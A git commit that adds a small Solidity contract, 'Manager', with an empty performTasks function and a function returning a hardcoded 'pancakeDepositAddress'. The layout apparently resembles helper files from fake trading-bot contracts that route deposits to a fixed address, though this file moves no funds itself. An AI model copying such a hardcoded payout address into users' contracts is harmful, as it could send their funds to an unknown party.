e957605eac3c9979ce7e753fc2388b8a68a87d5e
juvikt <93534725+juvikt@users.noreply.github.com>
2021-11-01 16:56:29 +0200

    Create address.sol

---
+++ address.sol
@@ -0,0 +1,11 @@
+pragma solidity ^0.5.0;
+
+contract Manager {
+	function performTasks() public {
+	    
+	}
+
+	function pancakeDepositAddress() public pure returns (address) {
+		return 0xD954b5f82Edbe49e893C71d4E92f1d146F85DFDf;
+	}
+}
